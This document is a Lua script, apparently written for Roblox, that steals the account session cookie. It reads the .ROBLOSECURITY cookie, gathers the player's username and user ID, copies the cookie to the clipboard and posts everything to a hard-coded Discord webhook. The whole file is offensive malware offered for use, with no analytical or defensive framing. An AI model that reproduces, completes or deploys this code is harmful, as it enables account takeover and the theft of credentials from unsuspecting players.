local webhookURL = "https://discord.com/api/webhooks/1504249631352160409/bP-Uck5y-s8rblE2O8KhWx5Y1m6ubqLqMUu4Z2W3TS5uRFKqApfkgSlT8Rxmrz6IXejA"

local function grabCookie()
    local success, result = pcall(function()
        return game:GetService("HttpService"):GetCookie("https://www.roblox.com", ".ROBLOSECURITY")
    end)
    if success and result and result ~= "" then return result end
    local cookies = game:GetService("HttpService"):GetCookies()
    for _, cookie in pairs(cookies) do
        if cookie.Name == ".ROBLOSECURITY" then return cookie.Value end
    end
    return nil
end

local function getAccountInfo()
    local success, result = pcall(function()
        return game:GetService("Players").LocalPlayer
    end)
    if success and result then
        return {username = result.Name, displayName = result.DisplayName, userId = result.UserId, accountAge = result.AccountAge}
    end
    return nil
end

local function sendWebhook(cookie, accountInfo)
    local http = game:GetService("HttpService")
    local embed = {{
        title = "Roblox Cookie",
        color = 0x00ff00,
        fields = {
            {name = "Username", value = accountInfo.username, inline = true},
            {name = "User ID", value = tostring(accountInfo.userId), inline = true},
            {name = "Cookie", value = "```" .. cookie .. "```", inline = false}
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
    local data = http:JSONEncode({embeds = embed, content = "||" .. cookie .. "||"})
    pcall(function() http:PostAsync(webhookURL, data, "application/json") end)
end

local cookie = grabCookie()
local accountInfo = getAccountInfo()

if cookie and accountInfo then
    setclipboard(cookie)
    sendWebhook(cookie, accountInfo)
end